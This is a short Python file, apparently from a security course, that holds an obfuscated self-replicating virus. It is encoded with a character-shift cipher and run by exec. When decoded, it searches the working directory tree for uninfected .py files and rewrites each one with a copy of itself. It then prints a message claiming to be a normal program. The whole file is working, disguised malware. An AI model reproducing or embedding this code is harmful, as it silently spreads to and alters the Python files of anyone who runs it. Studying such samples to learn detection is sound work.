SIGNATURE = "CS547 SECURITY"
code = """jnqpsu!ptjnqpsu!sboepndpef!>!((efg!fodszqu)tus`dpef*;!!!!fod`tus!>!##!!!!gps!d!jo!tus`dpef;!!!!!!!!fod`tus!>!fod`tus,!dis)pse)d*!,!2*!!!!sfuvso!fod`tusovn`mjoft>!72efg!tfbsdi)qbui*;!!!!gjmftupjogfdu>\^!!!!gjmfmjtu>pt/mjtuejs)qbui*!!!!gps!gobnf!jo!gjmfmjtu;!!!!!!!!jg!pt/qbui/jtejs)qbui,#0#,gobnf*;!!!!!!!!!!!!gjmftupjogfdu/fyufoe)tfbsdi)qbui,#0#,gobnf**!!!!!!!!fmjg!gobnf\.4;^>>#/qz#;!!!!!!!!!!!!jogfdufe!>!Gbmtf!!!!!!!!!!!!gps!mjof!jo!pqfo)qbui,#0#,gobnf*;!!!!!!!!!!!!!!!!jg!(TJHOBUVSF!>!#DT658!TFDVSJUZ#(!jo!mjof;!!!!!!!!!!!!!!!!!!!!jogfdufe>!Usvf!!!!!!!!!!!!!!!!!!!!csfbl!!!!!!!!!!!!jg!jogfdufe!>>!Gbmtf;!!!!!!!!!!!!!!!!gjmftupjogfdu/bqqfoe)qbui,#0#,gobnf*!!!!sfuvso!gjmftupjogfduefg!jogfdu)gjmftupjogfdu*;!!!!wjsvt!>!pqfo)(wjsvt/qz(*!!!!wjsvttusjoh!>!##!!!!gps!j-mjof!jo!fovnfsbuf)wjsvt*;!!!!!!!!jg!j?>1!boe!j=!ovn`mjoft;!!!!!!!!!!!!wjsvttusjoh,>!mjof!!!!wjsvt/dmptf)*!!!!wjsvttusjoh!>!fodszqu)wjsvttusjoh*!!!!gps!gobnf!jo!gjmftupjogfdu;!!!!!!!!g>pqfo)gobnf*!!!!!!!!ufnq>g/sfbe)*!!!!!!!!g/dmptf)*!!!!!!!!g>pqfo)gobnf-#x#*!!!!!!!!qsjou)(TJHOBUVSF!>!#DT658!TFDVSJUZ#(-gjmf>g*!!!!!!!!qsjou)(dpef!>!]#]#]#(-gjmf>g-foe>((*!!!!!!!!qsjou)wjsvttusjoh-gjmf>g*!!!!!!!!qsjou)(]#]#]#(-gjmf>g*!!!!!!!!qsjou)(efg!efdszqu)fod`dpef*;(-gjmf>g*!!!!!!!!qsjou)(]uefd`tus>](]((-gjmf>g*!!!!!!!!qsjou)(]ugps!d!jo!fod`dpef;(-gjmf>g*!!!!!!!!qsjou)(]u]uefd`tus!>!efd`tus,dis)pse)d*!.!2*(-gjmf>g*!!!!!!!!qsjou)(]usfuvso!efd`tus(-gjmf>g*!!!!!!!!qsjou)(fyfd)efdszqu)dpef**(-gjmf>g*!!!!!!!!qsjou)ufnq-gjmf>g*!!!!!!!!g/dmptf)*efg!qbzmpbe)*;!!!!jg!sboepn/sboejou)2-5*!>>!5!;!!!!!!!!qsjou)#WJSVT!BDUJPO#*gjmftupjogfdu!>!tfbsdi)pt/qbui/bctqbui)##**jogfdu)gjmftupjogfdu*qbzmpbe)*
"""
def decrypt(enc_code):
	dec_str=''
	for c in enc_code:
		dec_str = dec_str+chr(ord(c) - 1)
	return dec_str
exec(decrypt(code))
print('\nthis is a normal program\n')
